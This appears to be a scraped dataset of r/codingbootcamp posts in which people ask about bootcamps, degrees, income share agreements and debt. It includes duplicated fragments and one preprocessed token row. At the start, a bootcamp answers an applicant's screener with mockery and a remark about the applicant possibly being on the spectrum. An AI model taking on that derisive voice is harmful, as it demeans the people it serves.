**#41: Do we have permission to email you and invite you to the next group informational meeting with the instructor?** 

*Applicant*: Yes

&amp;#x200B;

**#43: So, any specific questions about the school? Do you have anything else you'd like to add?** 

*Applicant*: The more open you can be, the more I (and many others) will trust you and your course. I don't like being sold something when it's obvious they're trying to make it not like a sales pitch. I don't care if you have a department for sales or not if the experience is the same either way. Giving me a ""call to action"" that's spending $10,000 on your course is lame.

*Us*: We can't really be more open. We're all the way open. On one hand /  you say the story is repetitive and there is too much info / but then you suggest that we could be more open and honest? How does that work?  We help publically for free all the time. We have our faces all over the internet. We give out example lessons. We meet with people and give them free career guidance. We are terrible business people. We are probably too open. What is an example of how we can be more open?

You seem upset about the money part. We're not sure what to tell you. We have to pay bills and stuff. We don't think that paying for schools is very weird. We have an ISA that is dirt cheap / and that we actually get totally screwed on. We're actually going to remove it. 2.5k for a  full-time tutor for 6 months is a stupidly inexpensive system. There is absolutely nothing less expensive than DFTW. No one is selling anything.  We tell you what it is. Try to explain its value - for those who don't understand the industry and the pitfalls of the current educational choices - and then offer a free career guidance session. It just took us an hour to respond to this. It seems like your worldview is warped.  But also / we work with a lot of people on the spectrum and maybe you're just getting hung up on a few key points. You'll have to tell us.

Here's the books we used to design the curriculum: [https://perpetual.education/how-we-designed-our-curriculum](https://perpetual.education/how-we-designed-our-curriculum)

Here's an outline of exactly how it works / straight from the teachers: [https://perpetual.education/stories/how-dftw-works](https://perpetual.education/stories/how-dftw-works)

Here's a free section of the course: [https://perpetual.education/resources/free-responsive-design-challenge-workshop](https://perpetual.education/resources/free-responsive-design-challenge-workshop)

Here's out prices: [https://perpetual.education/tuition-calculator](https://perpetual.education/tuition-calculator)

Should we also take naked pictures of our bodies and post those on the site? How much more open and transparent could we possibly be? Should we stream while we're on the toilet?

What are you comparing us to?

&amp;#x200B;

**#19: How much do you \*really\* want to learn this stuff...** 

*Applicant*: The more open you can be, the more I (and many others) will trust you and your course. I don't like being sold something when it's obvious they're trying to make it not like a sales pitch. I don't care if you have a department for sales or not if the experience is the same either way. Giving me a ""call to action"" that's spending $10,000 on your course is lame.

*Us*: Out of all of the problematic things in this screener --- this is by far the most worrying. Most of the people who are 10/10 still won't make it through. So - the short answer here is that 8/10 isn't enough. We don't admit people who aren't 10/10.

\---

We don't try and talk people into anything. So - if you ever get to 10/10 - you can write us a letter and *beg* us? We're not really sure how it works. Can you please explain it to us?  


Good luck out there, REDACTED. We hope you find what you are looking for.

codingbootcamp,"Good afternoon everyone, I'm looking at moving over to the tech industry next year and I am in need some advice. I have zero to little experience with any type of coding/programming. I am looking at going to a boot camp early next year, but i'm wondering what things I can do that could possibly help me between now and then, so i'm not completely lost. I know many will not recommend it, but i'm in my early 30's, and I want to waste as little time as possible making this transition, so going the 4 year route isn't gonna work for me.

codingbootcamp,"I interviewed five coding bootcamp grads about their journey to learn to code and get a job. The big reasons why people do bootcamps is that: 

1. they want a structured curriculum 

2. they want to be accountable to turn work in 

3. they want mentorship 

4. they want a community

5. they want the credibility of the bootcamp

6. they want a faster way to get into the industry as compared to a university degree

The hardest parts of studying to get into the bootcamp are 1. knowing where to start, like which language to study and from which resource and 2. finding the time after a long day at work or school--most people opt to quit their jobs to study full time just to get into the bootcamp, something not everyone has the luxury to do. Most people are disappointed to learn that they receive very little mentorship in the bootcamp because instructors are spread thin between lots of students. Most grads reply to over 100 postings or contact hiring managers before finding a job. After starting to interview, most grads realize that they need to know algorithms and data structures but that the bootcamp did not prepare them for it and now they have to spend one or more months to learn the subject. Of the grads that I interviewed that were able to find a job, most opted to contact hiring managers directly rather than reply to job postings. Once hired, it took most grads several months to become productive, and they were hired with the expectation that they would need time to learn. 

If you want to hear their stories yourself, you can check out the Learning to Code interviews at [https://hypothesis.transistor.fm/episodes](https://hypothesis.transistor.fm/episodes). Note, not every interview is with people who chose the bootcamp route, so read the show notes first if that is what you want, and not every episode about learning to code has been posted yet.

Finally, when I broke into software engineering from a non-engineering background, I did so by building a really nice web app that I could show employers. I eventually even taught at a coding bootcamp for nearly a year. You don't need to do a coding bootcamp to get a job, but they do help. There are free resources out there. If you are trying to do full stack development, you can use the free open source curriculum at the [FreeCodeCamp.org](https://FreeCodeCamp.org) which will give you everything but the mentorship(which you don't get anyway) and the community(which you can find in other ways.)","I interviewed five coding bootcamp grads about their journey to learn to code and get a job, here is what I learned.","I interviewed five coding bootcamp grads about their journey to learn to code and get a job.

codingbootcamp,"Hello! I’ve been accepted into App Academy but I’m debating on the full time vs. part time program. 

Full time has ISA, but you’re not allowed to work during those 6months. Moving back home isn’t an option for me to minimize cost. Im fully responsible for my expenses. People have suggested taking out a personal loan during this time, but how in the world do you make the monthly payments if you can’t work? Could this be solved with gig work on the weekends?

Full time means you finish faster and have the option of ISA. I feel like this option is great if you’re living rent free or have savings to live off of. Feels incredibly risky if you don’t lol. Also the problem of finding a new job which could take a few months. Funds will probably run out before then.

Part time program is a year long commitment. Doesn’t offer ISA and you will pay $21,000 for the program. AppAcademy works with Climb Credit where you can take out a $19,000 loan but you need to pay $3,000 upfront to cover the rest of the cost. Monthly payments avg. at $639 over a period of 36 months. 

You can still work your full time job and have secure income. But you will also have a lot of work to do. Full time job AND immersive program. You will have to sacrifice your Saturday mornings as well. 

I’m super torn. I actually already have a lot of personal debt and it feels like I’m just adding more on top. The monthly payments for the part time program don’t seem manageable with my current employment. At the same time, I don’t know how I would make the monthly payments for the personal loans for the full time program. 

I would love to hear some advice or any past coding boot alumni’s experience with this. Which program did you go with and how did you manage it financially?

Thank you for your time. 🙏",Coding Boot Camp Financials,"Hello! I’ve been accepted into App Academy but I’m debating on the full time vs. part time program.

codingbootcamp,"I’ve done a great deal of research into different coding bootcamps and was hoping to score some intel from those that have already gone through them.

My question is, how many of your fellow cohorts have no college degree and were still able to land jobs in the field after bootcamps?

I am 33 with no degree, and I am married with 2 kids and an already demanding full time job. So going back to school at this point in my life would take probably 5-6 years of part time courses to get a Computer Science degree. I found out about these bootcamps and have heard of varying success, but I worry that all these high placement rates are filled with college grads who only did bootcamps to sharpen skills (with only a few outliers sprinkled in).

My current plan is to start with Odin to learn the basics. I’ve heard once you fall behind in these bootcamps, you can just get left behind and even wash out. I want to take a few months and learn what I can so I am not completely starting from zero. After a lot of research, I have it narrowed down to probably either Codesmith or Hack Reactor. Neither of which are cheap, but seem to be some of the top options. I am also completely open to suggestions, I narrowed it down to them because of reputation and help with job searches after graduation.

I have no delusions of grandeur that I’m going to graduate from the bootcamp and have a 6 figure job offer waiting for me. My hope is that I can get my foot in the door somewhere with a junior position and learn more on the job. Then maybe down the line I can parlay that into something higher up…but one step at a time right?

Long story short, would I be wasting my time and money on these bootcamps? I’m fearful that I’ll spend the money, know a lot about coding, and still be told “thanks but no thanks” because I didn’t take Psychology 101 classes in college.

I know the smart thing would be to finish my degree, however I cannot afford college at the moment so I am hoping to gain employment as a web developer and work towards my degree part-time in the future.

I've seen that Thinkful and other bootcamps typically claim high employment rates post-completion. However, it also seems that a lot of bootcampers possess college degrees; even if non-tech related. 

Will it be possible/likely to find a decent job having no degree? This is assuming I excel in the courses and become a skilled developer and build an impressive portfolio. My only concern is that having no degree will hold me back

  
Thanks",Will it be difficult to find a job after completing bootcamp with no degree?,"Hello,

 I'm a 1st year computer science student and I started a YT channel where I plan to share my work on tutorials that we do as a part of our Software development module on weekly basis! Hopefully I can enhance my learning experience this way because other people can see my mistakes even before my tutor marks my portfolio, and this can also be useful to anyone out there looking to practice their python skills on a similar level, OR for anyone who wants to enroll into CS uni. 

I would greatly appreciate any support, feedback, and ESPECIALLY constructive criticism. I thank you in advance and I look forward to meet new people in the programming community!

codingbootcamp,"Hi,

I’ve been struggling to get into tech especially I’m always busy working 60 to 70 hours a week to afford paying my bills  so almost no free time to code.
My plan was saving enough money for a 6 months expenses including my rent and quit my job and dedicate my whole time to code and build a portfolio and show it to recruiters later to get a job since I don’t have any previous tech experience. 
But recently I was reading a lot of people they got a job through a bootcamp so I changed my mind and I decided to give it a try and take advantage of their networking to get a job fast after graduation.
But during my research I came across a bootcamp called per scholas and I took a look at their software engineer program, but it seems they focus on the basics more, so now I’m very confused about if that bootcamp is good for me or not and if they really connect their alumni to recruiters after graduation and support them till they get a job.

codingbootcamp,"Hello everyone, I just figured I'd get some conversation going about this 11 month program that Nucamp is offering, as well as ask some questions. For those aware of nucamp, it is a combination three of their offerings, taken in sequence. First is development fundamentals, then back end, then their full stack web + mobile course. I haven't seen much conversation online for this particular bootcamp, but it seems like a good idea for someone in a situation like my own.  


Now that I've gotten that out of the way, here's a bit about my background. I am currently in my last semester of a Software Development Associate degree from my local community college. As most of you know, this has done little to prepare me for careers but has given me a nice amount of theory. I decided to go for my A+ cert and just got hired doing IT Support for a small software company, because I'm just not prepared to be a dev and need something resembling a career now. I want to be a web developer, but aside from my college courses, and some DIY websites thrown together with HTML, CSS, and JS I really don't have any acumen in the web dev space. 

This brings me to my plan. My girlfriend and I are moving out, and she has nursing school for the next year, which will leave me paying for more of the bills as her practicals will take upwards of 40 hours per week toward the end of the year. So, more college is off the table for the next year. Long run my plan is to get a bachelors, and I actually have 1 semester done at a local uni. I want to do this 11 month bootcamp thing, and read that they have a ""fair student agreement"" and part time classes which seems much more reasonable than the competition. I like working in groups and really like to have encouragement, I'm an extrovert and enjoy feeling that I'm part of something while I learn so a bootcamp seems like a good fit for me.  


Summary of covered topics:  
1.) Fundamentals - HTML, CSS, JS

2.) Back end - SQL, Python, frameworks  
3) Full stack - React, mongoDB, other frameworks

Link to the bootcamp mentioned: [https://www.nucamp.co/complete-bootcamp/software-engineering](https://www.nucamp.co/complete-bootcamp/software-engineering)  


In summary, after this is over, my qualifications will be:  
A.) 1+ year of technical support experience  
B.) A.S. in software dev  
C.) A robust portfolio via my experience at nucamp

With that in mind, I have some questions for the community, if anyone is willing/able to give any input:

1.) I plan to apply my full effort to building my portfolio with nucamp, as such will I be considered a viable candidate for entry level front end web development jobs with my qualifications?  
2.) Could anyone here share their experience job hunting after graduating nucamp or any other bootcamp?

codingbootcamp,"Hi everyone!

I just joined this group to ask some questions and get some insights. I have worked as an aerospace engineer for about 3 years (2017 - 2020). I quit working last year during pandemic because of long hours (12hours/day, sometimes 16 hours) and my mental and physical health. 

I took about 5 months of break but I wasn't just chilling and doing nothing but was planning and thinking about my next chapter. I decided to go to graduate school (aerospace) so I applied for the school. Early this year, I got accepted into the graduate school so I was planning to start this autumn. I did not want to waste my time so I was thinking about what I should do for this summer. 

I have always wanted to learn coding and also it would have helped for my master's program because I was planning to study Guidance, Navigation, and Controls field. So, I started a bootcamp in June and did it for 12 weeks. I did not have any coding background so I was quite overwhelmed with the amount of work but I started enjoying the program and really fell into it. I spent about 10-12 hours working on homework and projects. The bootcamp was for the Full-Stack Web Development so the curriculum did not cover the DSA that much.

Towards the end of the bootcamp, I started thinking about switching career to software from aerospace. Of course, that was not a spontaneous thoughts as I asked my software engineer friends about work life balance, salary, culture, etc. I eventually withdrew from the aerospace master's program and decided to pursue software industry.

The real problem came after I finished the bootcamp and of course I felt very lost what to do. I just started taking DSA course in Udemy and solving some easy Leetcode problems but I feel like I am going down the rabbit hole with no clear path. Some of my friends suggested me going back to school and get a CS degree but I was not sure if that is the optimal choice. 

Could anyone give me their experience or thoughts on how and what to prepare after the bootcamp to get a job as a software engineer (preferably backend)? I keep telling myself that I am committed to switch career and prepare to work hard but I feel very lost and not confident about how I am preparing... I would appreciate a lot if anyone shares their experience or thoughts. Thank you so much in advance!","Open to tips, advice, or guidance on my plan for new journey","Hi everyone!

I just joined this group to ask some questions and get some insights. I have worked as an aerospace engineer for about 3 years (2017 - 2020). I quit working last year during pandemic because of long hours (12hours/day, sometimes 16 hours) and my mental and physical health. 

I took about 5 months of break but I wasn't just chilling and doing nothing but was planning and thinking about my next chapter. I decided to go to graduate school (aerospace) so I applied for the school. Early this year, I got accepted into the graduate school so I was planning to start this autumn. I did not want to waste my time so I was thinking about what I should do for this summer. 

I have always wanted to learn coding and also it would have helped for my master's program because I was planning to study Guidance, Navigation, and Controls field.

codingbootcamp,"Hey everyone,

Not sure if this is the right place for this post. But hopefully someone can point me in the right direction…

So recently I have found myself in a conundrum with my current career as a professional drone pilot. My employer has stated that we will not be bringing any more employees on and that sucks. Why, because I run my department and won’t get relief any time soon. I don’t want to sound like I’m complaining, because I’m not. My wife and I recently found out that we are going to be having a baby! As a new father I want everything for my newborn. That said, I am looking to learning coding and or some sort software development. 

Is there a good starting place to learn before I just jump straight into college? Are there resources out there I can use to get a step up on the competition? My background is drone/UAV mapping and surveying in the geospatial field. I’m a quick learner when it comes to new computer software. As far as coding or anything of that nature I’m a complete newbie.",Newbie/new dad…looking for advice,"Hey everyone,

codingbootcamp,I just finished my first week of a coding boot camp out of San Francisco. I came in with maybe a few weeks of self study prior to starting.  And holy crap this is ridiculously difficult.  So far we are learning JavaScript fundamentals and I feel that I’m already behind and we have a test each week. If we fail 3 test we’re kicked out of the program. I just might be able to pass this test but at the difficulty of this program I can’t see it being possible at all to finish.  The people that are excelling like it’s nothing are people who have cs degree or have already learned full stack coding on their own for few years prior to starting.  Not sure if I should try and continue. I’d love to learn but wow does it seem beyond comprehension.,Just started a coding boot camp,I just finished my first week of a coding boot camp out of San Francisco.

codingbootcamp,"I want to use twitter as a metric to calculate number of US politicians that are named every day and pinpoint them on a map. For example ""Sheldon Whitehouse"" = +1 from Rhode Island.

I will be building this program on AWS to help me provision the massive information that will be running through this program that would continuously be talling up the mentioned of these politicians..

Since there are only 100 Senators it wouldn't need to look for more than 100 names..  
Additionally, i'd also like for the program to use search key words with these names such as: vaccines, republican, democrat, fake.. after it finds the name on twitter.

All this information would need to be compiled in an Excel spreed sheet that i would then use to draw an interactive database.

On the Excel the graph would show these parameters:

Name of Politician, state, key word #1, keyword #2, keyword #3, number of times mentioned, estimated growth prediction.

Since i need this program to run on AWS, i would need the information compiled on Excel and you would write the code to run on the server for these searches that would then be added on Excel.

Does anyone know what kind of program i would need to write to analyze tweets and the program i would use to make the states a darker color based on the number of mentions like the example below?

I would be happy to pay you for your time, thank you.

codingbootcamp,"Hi everyone! I just finished the application process to start General Assembly’s software engineering immersive course with an income share agreement. I have a few months before the course starts and I came across a new free program my state started that helps residents enter tech. The program is basically a year long paid apprenticeship where you work alongside mentors within the company to learn software engineering basics.

My dilemma is that I already have loans I’m paying off from my undergrad and don’t love the idea of taking out an ISA on top of that with no job guarantee. My hesitation with the state program is that it’s so brand new that I have no way of knowing how good it actually is BUT it’s technically job experience on my resume right out of the gate, which is something I know boot camp grads struggle with when they’re applying to jobs with no real world experience.

The program is basically a year long paid apprenticeship where you work alongside mentors within the company to learn software engineering basics.

My dilemma is that I already have loans I’m paying off from my undergrad and don’t love the idea of taking out an ISA on top of that with no job guarantee. My hesitation with the state program is that it’s so brand new that I have no way of knowing how good it actually is BUT it’s technically job experience on my resume right out of the gate, which is something I know boot camp grads struggle with when they’re applying to jobs with no real world experience.

(For more context this is the Illinois DPI tech ready program that started last year) 

What do you guys think?General Assembly vs state run tech apprenticeship",hi everyone finished application process start general assembly software engineering immersive course income share agreement month course start came across new free program state started resident enter tech program basically year long paid apprenticeship work alongside mentor within company learn software engineering basic dilemma already loan paying undergrad love idea taking isa top job guarantee hesitation state program brand new way knowing actually technically job experience resume right gate something grad struggle applying job real world experience context illinois dpi tech ready program started last year guy thinkgeneral assembly v state run tech apprenticeship

codingbootcamp,"I saw pramp mentoring but it's $800 for 4 hours and at that would reach the cost of a bootcamp fast. Is there anything else out there that would cover the above?

I'm a cs grad. I need new portfolio projects because the older ones are too old to discuss (I don't even want to put one of those languages on my resume). I have holes in my learning because the projects were our coding courses and it wasn't code reviewed. I got away with bad code as long as the project worked. 

I need a solid programming course with code review to make sure I don't end up with frankenstein projects by the time I'm done (so TOP or other free courses don't quite fit my needs). I also need to fill in those learning gaps as I only learned what I needed to complete the tasks; I can tinker with a few languages but I don't know any one of them really well. I also need to be able to discuss the components of the projects and coding principles which I never learned (again, we were mostly required to make projects work). 

I'm not in a bad spot to get interviews. I had nontechnical positions since graduation but I was able to leverage my technical knowledge to improve processes and wrote scripts for my current job that I use regularly to get things done more efficiently. But I need projects and fill in my learning. I especially need help with technical interviews because discussing technical topics (after working in non-tech jobs and explaining technical things to non-technical people every day) is a foreign concept to me. Technical discussions also didn't happen verbally in school. I basically need to learn to defend my degree.

codingbootcamp,"QUICK HISTORY: I'm 23 years old. Been in college since 2016. First studying biology, then switched to biochemistry, and finally about to graduate with a degree in computer science. However, during the period between biochem and comp sci, I was extremely close to starting bootcamp at App Academy. In fact, I called and cancelled during the grace period on the very day my cohort started. I then enrolled at an online accredited university for a computer science degree, graduating in December. more about that later.

&amp;#x200B;

I am very glad I decided to make that decision. The problems I see with coding bootcamps ever since enrolling in a degree program are 

1.)  Snake-like marketing scheme:

Many market themselves with job guarantees and shotty statistics which at first glance may seem very inticing (it was for me). In reality, these job guarantees often turn out to be inaccurate causing many to fall into a job search that does not end.  Let's analyze this logically. As a hiring manager, if I randomly choose two resumes for a software developer role, both with quality relavant to the job projects as experience, and one says BS Computer Science and the other says \[Insert bootcamp name\] graduate, there is little no chance the bootcamp grad is being chosen over the CompSci grad. It wouldn't make any sense. Why tell people this is a reality when indeed it is not? No offense to any bootcamp grads, but the jobs that will call back are the ones that have no comp sci applicants or comp sci applicants with very poor resumes. 

&amp;#x200B;

2.) Curriculum

Bootcamps dont teach any of the theory/mathematics I have taken during my time as a CS undergrad. Learning how to practically programming may sound fine and dandy, but having a deep fundamental understanding of how your code will scale, the time complexity of your algorithms, and the data structures associated with those algorithms is NECESSARY information. This is seemingly glossed over at many coding bootcamps as unimportant. The discrete mathematics is so valuable to learn too especially referring to set theory and modular arithmetic. These are things that will be go-to tools in some programming problems and interview questions. 

&amp;#x200B;

In conclusion, if you have no prior experience in IT, I would highly suggest pursuing a bachelors degree no matter how many people try and sell you on the shortcuts. I will not disclose the bachelor's degree programming I'm attending as not to look like a shill, but It is acreditted both regionally and nationally, allows you to complete as many classes as you can per term (if you can finish all your classes in one term, you'll earn your degree in one term \[i am currently in first term almost graduated\]), and has included all the courses I would have missed out on during the bootcamp route. There are other, cheaper, more effective options for breaking into the industry.

codingbootcamp,"Dunno exactly how to put this together without going off on a tangent but, I will do my best. So currently I am looking at 4 coding bootcamps: Flatiron, App Academy, Fullstack and Tech Elevator. The reason the title only shows three out of the four is because those are the ones that caught my eye(Flatiron, App Academy, and FullStack). Tech Elevator was recommended by a friend who recently graduated and is going through the hiring process.   


A little backstory, I'm from New York and at first I was in college but, I never finished as there were some personal circumstances getting in the way. I have done college twice and could not continue because of such personal circumstances. I was considering Flatiron because my sister told me a friend of hers went through a Bootcamp and got into Google and just before I could start, I was kicked out of my house and moved in with a friend. Luckily, that friend was also studying computer science in college. However, even though that was good for the start of my coding journey, I was stuck in a perdicament: Work to pay rent and learn on my own or Stick with a coding bootcamp. I chose to learn on my own two years ago, especially since the pandemic just began. Worst of all, my job was essential so I had to learn, work, and...well survive, I guess, but, I am not the only one who had to do this I'm sure. So the things I have gone through as I self taught myself were some of freecodecamp, still currently doing that, also gone through Cs50's intro to computer science but, I have not done the final project as of yet. I am reading some programming books such as The Bible of Algorithms and Data Structurres and the Pragmatic Programmer but, I feel as though there are many gaps in my knowledge and hurdles that I still need to cross. Luckily, I was able to move again and I am in a better living condition but, I am not sure for how long so I am making a ""life changing"" decision for myself and I want to pick the right one.  


Those hurdles include Algorithms, the bane of my coding existence BUT, I am still practicing no matter how difficult they are. I still have intentions to learn SQL and Python because of my love for robotics. I have read many subreddit posts and articles on whether or not going to a coding bootcamp was a good idea. This has led me to decide 4 TIME whether or not I wanted to try a coding bootcamp and now I want to give it my utmost attention. Now currently I am in the technical interview process for FullStack and Flatiron, I am in the midst of doing the coding test for App Academy so, now comes the reason I am posting right now.   


I want to make sure I have as much feedback from each three to four coding as I can before I can decide on the One. And I understand that with what I knwo so far, I might not need a coding bootcamp but, they offer resources that I do not have as well as mentors, assignments, and projects that I can go through and put into my resume. Even then, it would not stop me from continuing learning programming and bettering my skills for a future in this field. I just want to make the right decision. So, can you help me out with what ever you know. (Also a Bonus: If you have resources to help me with my algorithms and data structures. Other books for JavaScript and Python, if you know any good ones? That would be amazing!) Thank you so much for taking the time to read all of this!

And I understand that with what I knwo so far, I might not need a coding bootcamp but, they offer resources that I do not have as well as mentors, assignments, and projects that I can go through and put into my resume. Even then, it would not stop me from continuing learning programming and bettering my skills for a future in this field. I just want to make the right decision. So, can you help me out with what ever you know. (Also a Bonus: If you have resources to help me with my algorithms and data structures. Other books for JavaScript and Python, if you know any good ones? That would be amazing!) Thank you so much for taking the time to read all of this!

codingbootcamp,"Hi all,

I need some advice on choosing a coding bootcamp in Honolulu - I'm looking between DevLeague and NuCamp. Just some background, I have no CS degree or coding background, but I'm in the beginning stages of self learning online via CodeAcademy. I'm hoping to do either a web or software development program. I have a friend who went through DevLeague before they partnered with Kingsland University, and he had good things to say. If there are any local coders out there, or people who have gone through either bootcamp, please share your advice and stories!!

codingbootcamp,"Prior to my coding bootcamp, I was a fine arts student who couldn't find a job. I can't begin to tell you the countless times people asked me about ""going back to school"" so I could ""get a better education"", recruiters and other interviewee's telling me that my ""arts degree"" is ""useless"".

Overall, that job-seeking time in my life was pretty hectic and emotionally draining.

Eventually, a friend mentioned programming to me, and I fell in love.

I never thought a stereo-typical ""creative"" like me could fall in love with something so ""out of my realm"", but, I did.

I considered going back to school to get my BS in CS, but, it would have taken four years and I didn't have the time, nor finances. So, I applied, and was soon accepted into a bootcamp. I took out an ISA loan and made it my goal to put my heart and soul into the program.

The bootcamp itself was intense, rigorous, and challenging. But at the same time, I was battling living in a severely abusive household that made it difficult overall.

I couldn't focus well on projects, and barely passed most assessments and projects given.

But, at the end of the day, I graduated.

However, life threw me a major curveball after graduating from my coding bootcamp.

Nearly a month after graduation, I was kicked out and was homeless for a handful of weeks. Luckily, I was able to keep my ground and am now living with friends.

It's been seven months since graduating from my coding bootcamp and I feel incredibly discouraged.

In a nutshell, life threw me a major curveball after graduation.

Within those months following me being kicked out from my family's house, I've had to put coding and the job search aside completely.

Since then, I've taken up a freelance writing job for now but am seriously itching to get back into coding so I can make my way back into the job hunt and find a well-paying job I enjoy.

But, to be frank, I have no idea where to start.

I've forgotten most everything I learned from the bootcamp. My GitHub is empty. My projects are nonexistent (it was incredibly hard for me to complete the bootcamp suitably because of my abusive living situation).

Now that it's seven months out and I'm just now beginning to get a footing, I don't know where to begin. If anything, I feel like I need to start all over and self-teach myself because I don't have access to the materials and resources from the bootcamp anymore since it's been so much time past.

I'm concerned about how this will look on a resume. I'm concerned about how to even begin, what to study, etc. I still have this 20k ISA loan looming over my head that's also giving me a lot of anxiety.

At this point, I'm just looking for words of encouragement, advice, and help because I really don't know what to do, and I'm feeling incredibly discouraged.","It's been seven months since graduating from my coding bootcamp and due to a slew of unexpected life events, I don't know what to do.","Prior to my coding bootcamp, I was a fine arts student who couldn't find a job.

codingbootcamp,"Hi all!  
I'm planning on switching careers from psychology to tech! I have no experience with coding at all but am slowly learning the basics. I'm in NJ so I'm looking at NY based coding bootcamps even though I know everything is online now!   
The ones I'm looking at all focus on JS but from many videos I've seen, Python is the way to go? I'm not sure if this has been addressed anywhere else but I just wonder why? Some videos that are ""things I would change if I could start again"" or ""tips for beginners"" suggest learning python bc of how easy it is compared to other programming languages. Having dabbled very little in both, I do see how Python is much more straightforward and simple!  
So I guess my overall question is, should I still study Python if I want to get into a bootcamp (Fullstacks, Flatiron, Codesmith), or go the classic JS way since that's what will be used ?

Also alot of mentors work in the industry and some prior students but they all know there stuff.How is support like and course like in different bootcamps?,currently lighthouse lab way learning 2 hour lecture rest day coding material 2030 mentor available youre stuck google hangout chat anyhring code focus mentor support found helpful public site mentor support wondering especially remote many mentor ta available alot mentor work industry prior student stuffhow support course different

codingbootcamp,"So I have been looking at different bootcamps lately, and how they are structured to see what is best for me. I came across code academy who offers a part time in 16 weeks to learn 1 full stack, and optional 2 more stacks, 8 weeks each. Full time, they combine all of them, whereas pretty much every other one I cam across only concentrate on 1.

So, I think my main concern now is, should I pick one that concentrates one one and try to really get that one down, or maybe do a bootcamp that may be shorter, whereas I may not get as much learning.

Some bootcamps teach 1 stack that takes like 12 weeks, and some others are longer/shorter.",Are longer bootcamps better?,"So I have been looking at different bootcamps lately, and how they are structured to see what is best for me.

codingbootcamp,"So I'm having a mid-midlife crisis where I hate my career path, and have also discovered that I am very interested in becoming a web developer. I am in healthcare and have really become drawn to finding a niche in healthcare tech to eventually transition into software development maybe with a healthcare software company or something along those lines. I do not have coding experience , I am currently learning Python. 

A few things that are really confusing how I should go about this are:

No college degree - due to some life circumstances I never finished college. I went to community college years ago to get into nursing, and realized I hated nursing and never graduated. I did manage to complete a lot of general education courses though.

I am going to be 40 next year.  

The two camps that I keep reading opinions from seem to be:

get a college degree because you won't get a job without one. Taking this advise, I actually enrolled in my state college and am currently in the first 2 required courses towards a CS degree. However since I can only go part time (2 classes a semester) It will take me about 4-5 years to finish this degree due to all the prerequisite Math that I never took before (cal I, II, III, etc).

and the second camp is:

don't waste your time and money on a four year cs degree, go to a bootcamp and build a portfolio because your not getting any younger. This is iffy for me because I feel like people that succeed in bootcamps already have an unrelated college degree or some coding experience, which I do not have. Will I be spending thousands of dollars just to be turned away for every job due to no degree?

Since I work full time (and am a caregiver to a senior parent)  I cannot do both a cs degree and coding bootcamp. I also cannot take more than 2 classes a semester. I really am interested in learning this skill and I am so far not doing bad in my classes. Who knows when the math classes get harder how I will do, but I would like some thoughts from people in this field.

I know that ultimately it is up to me and how much time and dedication I put into it, and I am willing to do the work, I am just trying to pick the right path for me based on these other factors. Maybe I am overthinking the age thing, maybe not.

codingbootcamp,"I graduated in December 2019 with my degree in art, a minor in english. When I graduated, I had no job experience at all. I lived with my parents.

Fast forward two years, after sending out nearly 600+ applications for a myriad of jobs, I couldn't get anything. A friend told me about coding, so I took a stab at studying for it by myself. Fell surprisingly in love with the complexity of it all, so I decided to pursue it. So? I joined a coding bootcamp.

Still living at home, things started getting rough. My house eventually became an abusive environment. It was hard for me to focus, let alone get the most simple of tasks done while at the bootcamp.

Four months later, I graduate the coding bootcamp, with one barely finished project and barely anything to show for it. Well... aside from being now 20k in debt.

I tried my hand at getting jobs in coding while self-teaching but it became rough. Eventually during a luck-of-the-draw interview, the interviewee ended up telling me how she only interviewed me because of my ""cover letter"" and because ""i wrote well"". She inquired why I wasn't going for something like UX design and told me I should pursue it because of my ability to write well and have an eye for design.

So, I started self-teaching UX/UI Design. Spent months working on building up a single passion project and starting applying for jobs in that realm. Still radio silence.

During this time, things at my home became violent, so I decided to up and leave and move in with my partner.

Ever since moving in with my partner, I've tried figuring out what to do.

I've tried pursuing software development, but barely remember anything from the course due to family issues/trauma. I enjoyed what I did, but I'm unsure of whether it'd be something feasible to consider knowing I'll have to try and find a place of my own in six months. And well, after taking a look at the r/learnprogramming and r/cscareerquestions subreddit, it seems like it takes more than a year for most self-study programmers to land a job.

When it comes to a career/job?

If I'm being 100% honest, if someone came to me tomorrow and said, ""You could be a fulltime illustrator, selling your work on Etsy, etc., pay all of your bills, pay your own health insurance, set up a 401k, etc and be able to have a little extra money left over for emergencies..."" I would do it in a heartbeat. No questions asked. But, considering my current situation, I don't know/think if that's even feasible.

For personal reasons, I'm not going to have a place to live in six months/I'll need to be able to independently support myself in six months. 

Due to my income agreement/debt from the bootcamp, I owe a hefty 20% of my monthly income to the debt once I reach a job that pays 40k. After crunching my own finances, I'll at the very least need a job that pays $55k+ starting to survive (In terms of freelance? I'll need a job that pays at least $60 hourly pre-tax, as freelancers have to pay a lot in terms of taxes, so, I'll need to cover for that expense as well as retirement/health insurance.)

I've considered freelancing full-time by starting my own branding, low-code design company to pay the bills and then illustrate on the side, but I'm not sure if that would pay well/there be a niche for it. I have strong experience in writing, branding, using squarespace (basic understanding of wordpress), but I'm not sure if I'd be able to build a successful business off of those skills.

I've also considered freelancing because, if no one's giving me opportunities I know I can excel in, then why not create them for myself? But again, I'm just worried about not being able to make a solid/consistent living off of it.

In terms of a full-time job, I'd be open to pursuing software development if there would be a possibility of a job in six months time after self-study, I just have no idea of where or how to begin with that. The one thing that holds me to pursuing a full-time job versus a freelance income is the fact that there is consistency and I'd be able to leave work at work. There's stability, schedule, and a confident sense of financial independence that comes with it. It would also give me the time to pursue my real passion after hours and not have to worry about covering health insurance, PTO, 401k, etc.

Basically as a TL;DR:

After years of applying to a myriad of jobs, I decided to pursue a coding bootcamp. During this time, I was struggling with family issues. Because of these issues, I barely took anything out of the bootcamp because it was hard to focus.

Left the bootcamp now 20k in debt and barely anything to show for it.

Now that I may not have somewhere to live in six months, I need to find a way to support myself financially and find a job that at least pays 55k starting in order to cover my basic + health needs and my bootcamp debt.

I can't decide between trying my hand at software engineering again (even if I don't know where to start with that), and try and get a job in six months time after self-study.

OR

Go the freelance route. If no one's willing to give me a chance, why not make my own way? If I went this route, I would need to make $60 hourly minimum in order to survive (taking into account freelance taxes, health insurance, cost of health prescriptions, and my 20k coding debt). If I went this route, I was considering setting up different sources of income (tee shirt designs, stickers, ...) while also pursuing branding/squarespace design as a career. Once I got on my feet, I would then more actively pursue freelancing.

I don't know which way to go, but, I need help figuring it out sooner than later and felt this would be the best place to ask. So, that said, any advice?

(I apologize if any of the above is a bit all over the place, sort of currently struggling with a panic attack as I type this all out. I really appreciate your help.)",I’m not sure what to do anymore. I graduated in March and am now 20k in debt. Dealt with family abuse during/after bootcamp so I barely have anything to show for it. Need advice.,"I graduated in December 2019 with my degree in art, a minor in english. When I graduated, I had no job experience at all. I lived with my parents.

